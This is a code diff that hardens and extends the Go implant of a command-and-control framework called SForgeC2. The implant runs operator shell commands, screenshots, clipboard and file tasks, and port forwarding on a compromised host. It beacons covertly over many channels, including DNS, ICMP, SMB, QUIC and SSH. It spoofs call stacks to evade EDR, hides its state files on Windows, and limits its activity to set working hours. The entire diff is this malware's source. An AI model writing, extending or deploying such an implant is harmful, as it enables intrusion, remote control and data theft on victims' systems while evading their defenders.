@@ -169,16 +169,17 @@ func init() {
 		BeaconURI = "/api/v1/beacon"
 	}
 	BeaconMethod = "POST" // FORCE POST �?GET with body is unreliable in Go's http client
-	BeaconTransport = BeaconTransportStr
-	if BeaconTransport == "" {
-		BeaconTransport = "http"
+	bt := BeaconTransportStr
+	if bt == "" {
+		bt = "http"
 	}
+	setBeaconTransport(bt)
 
 	// SMB pipe name: use explicit config or extract from C2URL
 	smbPipeName = SMBPipeName
 	if smbPipeName == "" {
 		// Try to extract from C2URL when Protocol is "smb"
-		if Protocol == "smb" || strings.HasPrefix(C2URL, "smb://") {
+		if getProtocol() == "smb" || strings.HasPrefix(C2URL, "smb://") {
 			smbPipeName = strings.TrimPrefix(C2URL, "smb://")
 		}
 	}
@@ -344,9 +345,7 @@ func init() {
 	}
 
 	// Working hours
-	workingStart = WorkingStartStr
-	workingEnd = WorkingEndStr
-	workingTZ = WorkingTZStr
+	setWorkingHours(WorkingStartStr, WorkingEndStr, WorkingTZStr)
 
 	// Kill date
 	if KillDateStr != "" {
@@ -449,7 +448,7 @@ func main() {
 	loadBeaconState()
 
 	// Mark as SMB child if using SMB transport
-	if Protocol == "smb" || BeaconTransport == "smb" {
+	if getProtocol() == "smb" || getBeaconTransport() == "smb" {
 		isSMBChild = true
 		if Debug {
 			fmt.Printf(s(SForgeC2)+" SMB child mode, pipe: %s\n", smbPipeName)
@@ -493,7 +492,7 @@ func main() {
 	}
 
 	// Run egress detection on first startup if configured
-	if Protocol != "smb" && (BeaconTransport == "auto" || egressDetection) {
+	if getProtocol() != "smb" && (getBeaconTransport() == "auto" || egressDetection) {
 		c2Host := extractC2Host()
 		ports := parseEgressPorts()
 		if Debug {
@@ -509,11 +508,11 @@ func main() {
 			}
 			switch {
 			case strings.HasPrefix(bestEgressProto, "tcp/"):
-				Protocol = "tcp"
+				setProtocol("tcp")
 			case bestEgressProto == "dns":
-				Protocol = "dns"
+				setProtocol("dns")
 			case bestEgressProto == "icmp":
-				Protocol = "icmp"
+				setProtocol("icmp")
 			}
 		}
 	}
@@ -530,13 +529,17 @@ func main() {
 			os.Exit(0)
 		}
 
-		// Ghost mode: send final beacon, then sleep
+		// Ghost mode: send final beacon, then hide. Sleep in one-hour slices
+		// so an operator-triggered ghost exit (or the auto-expiry timer) is
+		// observed promptly instead of up to 24h later.
 		if isInGhostMode() {
 			if !ghostBeaconSent {
 				ghostBeaconSent = true
-				doBeacon()
+				doBeaconSafe()
 			}
-			time.Sleep(24 * time.Hour)
+			for i := 0; i < 24 && isInGhostMode(); i++ {
+				time.Sleep(1 * time.Hour)
+			}
 			continue
 		}
 
@@ -545,7 +548,7 @@ func main() {
 			beaconSched.CheckTriggers()
 		}
 
-		doBeacon()
+		doBeaconSafe()
 		beaconCount++
 
 		// Exponential backoff on consecutive beacon failures
@@ -577,11 +580,12 @@ func main() {
 		}
 
 		// Working hours check: if outside working hours, sleep until next window
-		if workingStart != "" && workingEnd != "" {
+		wh := getWorkingHours()
+		if wh.start != "" && wh.end != "" {
 			if !isWithinWorkingHours() {
 				sleepDuration := timeUntilNextWindow()
 				if Debug {
-					fmt.Printf("[working] Outside working hours (%s-%s), sleeping %v\n", workingStart, workingEnd, sleepDuration)
+					fmt.Printf("[working] Outside working hours (%s-%s), sleeping %v\n", wh.start, wh.end, sleepDuration)
 				}
 				if sleepDuration < 0 {
 					sleepDuration = 0
@@ -693,6 +697,7 @@ func checkFastMode(tasks []Task) {
 		"screenshot": true, "screenshot_window": true, "shell": true, "ps": true,
 		"clipboard_get": true, "clipboard_set": true, "find": true, "drives": true,
 		"services": true, "beacon_now": true, "ls": true, "read": true,
+		"mkdir": true, "rename": true, "chmod": true,
 	}
 	for _, task := range tasks {
 		if fastTypes[task.Type] {
@@ -809,6 +814,22 @@ func loadBeaconState() {
 	if data, err := os.ReadFile(getBeaconStateFilePath("registered")); err == nil {
 		registered = strings.TrimSpace(string(data)) == "1"
 	}
+	// Update trust root: delivered once over the encrypted session via
+	// config_push and persisted so self_update keeps verifying across restarts.
+	if data, err := os.ReadFile(getBeaconStateFilePath("update.key")); err == nil {
+		if k := strings.TrimSpace(string(data)); len(k) == 64 {
+			updatePinnedPubKeyHex = k
+		}
+	}
+}
+
+// persistUpdatePubKey stores the pinned update public key next to the other
+// beacon state, hidden on Windows like its siblings.
+func persistUpdatePubKey(keyHex string) {
+	path := getBeaconStateFilePath("update.key")
+	if err := os.WriteFile(path, []byte(keyHex), 0600); err == nil && runtime.GOOS == "windows" {
+		setHidden(path)
+	}
 }
 
 // persistBeaconState saves the current frame sequence and registration marker.
@@ -867,16 +888,17 @@ func reparseNetworkConfig() {
 	if BeaconURI == "" {
 		BeaconURI = "/api/v1/beacon"
 	}
-	BeaconTransport = BeaconTransportStr
-	if BeaconTransport == "" {
-		BeaconTransport = "http"
+	bt := BeaconTransportStr
+	if bt == "" {
+		bt = "http"
 	}
+	setBeaconTransport(bt)
 	if id, perr := strconv.ParseUint(ListenerIDStr, 10, 32); perr == nil {
 		ListenerID = uint(id)
 	}
 	smbPipeName = SMBPipeName
 	if smbPipeName == "" {
-		if Protocol == "smb" || strings.HasPrefix(C2URL, "smb://") {
+		if getProtocol() == "smb" || strings.HasPrefix(C2URL, "smb://") {
 			smbPipeName = strings.TrimPrefix(C2URL, "smb://")
 		}
 	}
@@ -994,8 +1016,40 @@ func enqueueResults(results []TaskResult) {
 	}
 }
 
+// reenforcePendingBounds re-applies the bounded-queue limits after a failed
+// beacon splices its unsent results back onto the queue (a splice bypasses
+// enqueueResult), so repeated failures cannot grow memory without bound:
+// results beyond maxPendingResults and aggregate output beyond
+// maxPendingResultBytes are dropped oldest-first. Caller holds pendingMu.
+func reenforcePendingBounds() {
+	for len(pendingResults) > maxPendingResults {
+		pendingResults = pendingResults[1:]
+	}
+	totalBytes := 0
+	for i := range pendingResults {
+		totalBytes += len(pendingResults[i].Output)
+	}
+	for totalBytes > maxPendingResultBytes && len(pendingResults) > 0 {
+		totalBytes -= len(pendingResults[0].Output)
+		pendingResults = pendingResults[1:]
+	}
+}
+
 func availableTaskCapacity() int {
 	return cap(taskQueue) - len(taskQueue)
+}
+
+// doBeaconSafe wraps doBeacon with panic recovery so an unexpected panic in
+// any handler or transport path cannot kill the beacon loop (A-H2).
+func doBeaconSafe() {
+	defer func() {
+		if r := recover(); r != nil {
+			if Debug {
+				fmt.Printf("[!] beacon panic recovered: %v\n", r)
+			}
+		}
+	}()
+	doBeacon()
 }
 
 func doBeacon() {
@@ -1016,6 +1070,13 @@ func doBeacon() {
 	rpfData := rportfwdCollectOutbound()
 	if len(rpfData) > 0 {
 		socksData = append(socksData, rpfData...)
+		inFastMode.Store(true)
+	}
+
+	// Collect lportfwd tunneled data (local listener -> C2 -> target)
+	lpfData := lportfwdCollectOutbound()
+	if len(lpfData) > 0 {
+		socksData = append(socksData, lpfData...)
 		inFastMode.Store(true)
 	}
 
@@ -1090,6 +1151,7 @@ func doBeacon() {
 		pendingMu.Lock()
 		pendingResults = append(resultsCopy, pendingResults...)
 		pendingTaskAcks = append(acksCopy, pendingTaskAcks...)
+		reenforcePendingBounds()
 		pendingMu.Unlock()
 		beaconConsecutiveFailures++
 		return
@@ -1104,14 +1166,15 @@ func doBeacon() {
 	// routines from userland stack-walk based EDR attribution.
 	var respBody []byte
 	runBeaconSendSpoofed(func() {
+		curProto, curBT := getProtocol(), getBeaconTransport()
 		switch {
 		case P2PParent != "":
 			respBody = sendP2PBeacon(sendBody)
-		case Protocol == "smb" || BeaconTransport == "smb":
+		case curProto == "smb" || curBT == "smb":
 			respBody = sendSMBBeacon(sendBody)
-		case Protocol == "tcp":
+		case curProto == "tcp":
 			respBody = sendTCPBeacon(sendBody)
-		case Protocol == "dns":
+		case curProto == "dns":
 			respBody = sendDNSBeacon(sendBody)
 			if respBody == nil {
 				dnsConsecutiveFailures++
@@ -1122,25 +1185,27 @@ func doBeacon() {
 					if Debug {
 						fmt.Println("[!] DNS failure threshold reached, falling back to HTTP")
 					}
-					Protocol = "http"
+					setProtocol("http")
 					respBody = sendWithMode(sendBody)
 				}
 			} else {
 				dnsConsecutiveFailures = 0
 			}
-		case Protocol == "icmp":
+		case curProto == "icmp":
 			respBody = sendICMPBeacon(sendBody)
-		case Protocol == "udp":
+		case curProto == "udp":
 			respBody = sendUDPBeacon(sendBody)
-		case BeaconTransport == "wss":
+		case curProto == "quic" || curBT == "quic" || strings.HasPrefix(c2URLAtIndex(int(currentC2Idx.Load())), "quic://"):
+			respBody = sendQUICBeacon(sendBody)
+		case curBT == "wss":
 			respBody = sendWSSBeacon(sendBody)
-		case BeaconTransport == "grpc" || strings.HasPrefix(c2URLAtIndex(int(currentC2Idx.Load())), "grpc://") || strings.HasPrefix(c2URLAtIndex(int(currentC2Idx.Load())), "grpcs://"):
+		case curBT == "grpc" || strings.HasPrefix(c2URLAtIndex(int(currentC2Idx.Load())), "grpc://") || strings.HasPrefix(c2URLAtIndex(int(currentC2Idx.Load())), "grpcs://"):
 			respBody = sendGRPCBeacon(sendBody)
-		case BeaconTransport == "ssh" || strings.HasPrefix(c2URLAtIndex(int(currentC2Idx.Load())), "ssh://"):
+		case curBT == "ssh" || strings.HasPrefix(c2URLAtIndex(int(currentC2Idx.Load())), "ssh://"):
 			respBody = sendSSHBeacon(sendBody)
-		case BeaconTransport == "mtls" || strings.HasPrefix(c2URLAtIndex(int(currentC2Idx.Load())), "mtls://"):
+		case curBT == "mtls" || strings.HasPrefix(c2URLAtIndex(int(currentC2Idx.Load())), "mtls://"):
 			respBody = sendMTLSBeacon(sendBody)
-		case BeaconTransport == "h2c" || strings.HasPrefix(c2URLAtIndex(int(currentC2Idx.Load())), "h2c://"):
+		case curBT == "h2c" || strings.HasPrefix(c2URLAtIndex(int(currentC2Idx.Load())), "h2c://"):
 			respBody = sendH2CBeacon(sendBody)
 		default:
 			respBody = sendWithMode(sendBody)
@@ -1155,6 +1220,7 @@ func doBeacon() {
 		pendingMu.Lock()
 		pendingResults = append(resultsCopy, pendingResults...)
 		pendingTaskAcks = append(acksCopy, pendingTaskAcks...)
+		reenforcePendingBounds()
 		pendingMu.Unlock()
 		// If the server never saw the frame (transport failure) our persisted
 		// sequence may need to move forward. Advance by a small bounded step
@@ -1462,8 +1528,12 @@ func sendToC2(idx int, body []byte) []byte {
 	if len(malleableRespDecodeSteps) > 0 {
 		if dec, err := agentApplyTransforms(data, malleableRespDecodeSteps, false); err == nil {
 			data = dec
-		} else if Debug {
-			fmt.Printf("[!] malleable response decode failed: %v\n", err)
+		} else {
+			if Debug {
+				fmt.Printf("[!] malleable response decode failed: %v\n", err)
+			}
+			// Treat as transport failure so backoff/failover logic kicks in.
+			return nil
 		}
 	}
 	return data
@@ -1552,7 +1622,7 @@ func sendTCPBeacon(body []byte) []byte {
 	if useTLS {
 		conn, err = dialUTLSTCP("tcp", addr)
 	} else {
-		conn, err = net.Dial("tcp", addr)
+		conn, err = net.DialTimeout("tcp", addr, 10*time.Second)
 	}
 	if err != nil {
 		if Debug {
@@ -1561,6 +1631,7 @@ func sendTCPBeacon(body []byte) []byte {
 		return nil
 	}
 	defer conn.Close()
+	conn.SetDeadline(time.Now().Add(30 * time.Second))
 
 	// Write length (BE) + body
 	if err := binary.Write(conn, binary.BigEndian, uint32(len(body))); err != nil {
@@ -1762,24 +1833,34 @@ func sendTaskResult(res TaskResult) {
 		inFastMode.Store(true)
 		return
 	}
-	if Protocol == "tcp" {
-		sendTCPBeacon(sendBody) // fire and forget
-	} else if Protocol == "dns" {
-		sendDNSBeacon(sendBody) // fire and forget
-	} else if Protocol == "smb" || BeaconTransport == "smb" {
-		sendSMBBeacon(sendBody)
-	} else if BeaconTransport == "wss" {
-		sendWSSBeacon(sendBody)
-	} else if BeaconTransport == "ssh" || strings.HasPrefix(	c2URLAtIndex(int(currentC2Idx.Load())), "ssh://") {
-		sendSSHBeacon(sendBody)
-	} else if BeaconTransport == "mtls" || strings.HasPrefix(	c2URLAtIndex(int(currentC2Idx.Load())), "mtls://") {
-		sendMTLSBeacon(sendBody)
-	} else if BeaconTransport == "h2c" || strings.HasPrefix(	c2URLAtIndex(int(currentC2Idx.Load())), "h2c://") {
-		sendH2CBeacon(sendBody)
-	} else if BeaconTransport == "grpc" || strings.HasPrefix(	c2URLAtIndex(int(currentC2Idx.Load())), "grpc://") || strings.HasPrefix(	c2URLAtIndex(int(currentC2Idx.Load())), "grpcs://") {
-		sendGRPCBeacon(sendBody)
-	} else {
-		sendBeacon(sendBody)
+	var resp []byte
+	curProto, curBT := getProtocol(), getBeaconTransport()
+	switch {
+	case curProto == "tcp":
+		resp = sendTCPBeacon(sendBody)
+	case curProto == "dns":
+		resp = sendDNSBeacon(sendBody)
+	case curProto == "smb" || curBT == "smb":
+		resp = sendSMBBeacon(sendBody)
+	case curBT == "wss":
+		resp = sendWSSBeacon(sendBody)
+	case curBT == "ssh" || strings.HasPrefix(c2URLAtIndex(int(currentC2Idx.Load())), "ssh://"):
+		resp = sendSSHBeacon(sendBody)
+	case curBT == "mtls" || strings.HasPrefix(c2URLAtIndex(int(currentC2Idx.Load())), "mtls://"):
+		resp = sendMTLSBeacon(sendBody)
+	case curBT == "h2c" || strings.HasPrefix(c2URLAtIndex(int(currentC2Idx.Load())), "h2c://"):
+		resp = sendH2CBeacon(sendBody)
+	case curBT == "grpc" || strings.HasPrefix(c2URLAtIndex(int(currentC2Idx.Load())), "grpc://") || strings.HasPrefix(c2URLAtIndex(int(currentC2Idx.Load())), "grpcs://"):
+		resp = sendGRPCBeacon(sendBody)
+	case curProto == "quic" || curBT == "quic" || strings.HasPrefix(c2URLAtIndex(int(currentC2Idx.Load())), "quic://"):
+		resp = sendQUICBeacon(sendBody)
+	case curProto == "udp":
+		resp = sendUDPBeacon(sendBody)
+	default:
+		resp = sendBeacon(sendBody)
+	}
+	if resp == nil {
+		enqueueResult(res)
 	}
 }
 func executeTask(task Task) TaskResult {
@@ -1856,12 +1937,47 @@ func executeTask(task Task) TaskResult {
 		}
 	}
 
+	// Alias resolution happens before dispatch so results always carry the
+	// canonical type (renderers and the timeline key off it). The AAD binding
+	// covers agent UUID + task ID only, so rewriting Type here is safe.
+	if canon, ok := protocol.ResolveAlias(task.Type); ok && canon != task.Type {
+		task.Type = canon
+		res.Type = canon
+	}
+
 	if handler, ok := taskHandlers[task.Type]; ok {
 		handler(task, &res)
 	} else {
-		res.Error = "unknown task type: " + task.Type
+		res.Error = "unknown task type: " + task.Type + " (send a \"help\" task for the command list)"
 	}
 	return res
+}
+
+const maxOutputSize = 8 * 1024 * 1024
+
+// limitWriter caps how much command output is buffered so a runaway command
+// (e.g. an unbounded log dump) cannot exhaust agent memory; bytes past the
+// limit are discarded and the truncation is flagged for the final result.
+type limitWriter struct {
+	w         *bytes.Buffer
+	n         int
+	limit     int
+	truncated bool
+}
+
+func (lw *limitWriter) Write(p []byte) (int, error) {
+	if lw.n >= lw.limit {
+		lw.truncated = true
+		return len(p), nil
+	}
+	remaining := lw.limit - lw.n
+	if len(p) > remaining {
+		p = p[:remaining]
+		lw.truncated = true
+	}
+	n, err := lw.w.Write(p)
+	lw.n += n
+	return n, err
 }
 
 func runShell(cmdStr, shell string) (string, error) {
@@ -1884,11 +2000,13 @@ func runShell(cmdStr, shell string) (string, error) {
 		} else {
 			cmd = exec.CommandContext(ctx, "sh", "-c", cmdStr)
 		}
+		setShellProcGroup(cmd)
 	}
 
 	var out bytes.Buffer
-	cmd.Stdout = &out
-	cmd.Stderr = &out
+	lw := &limitWriter{w: &out, limit: maxOutputSize}
+	cmd.Stdout = lw
+	cmd.Stderr = lw
 	err := cmd.Run()
 	if err != nil && ctx.Err() != nil && cmd.Process != nil {
 		// Task aborted or timed out: the context kill only terminates the
@@ -1898,8 +2016,11 @@ func runShell(cmdStr, shell string) (string, error) {
 		if runtime.GOOS == "windows" {
 			_ = exec.Command("taskkill", "/F", "/T", "/PID", strconv.Itoa(cmd.Process.Pid)).Run()
 		} else {
-			_ = cmd.Process.Kill()
+			killShellProcGroup(cmd)
 		}
+	}
+	if lw.truncated {
+		out.WriteString("\n[output truncated at 8MB]")
 	}
 	return decodeShellOutput(out.Bytes(), shell), err
 }
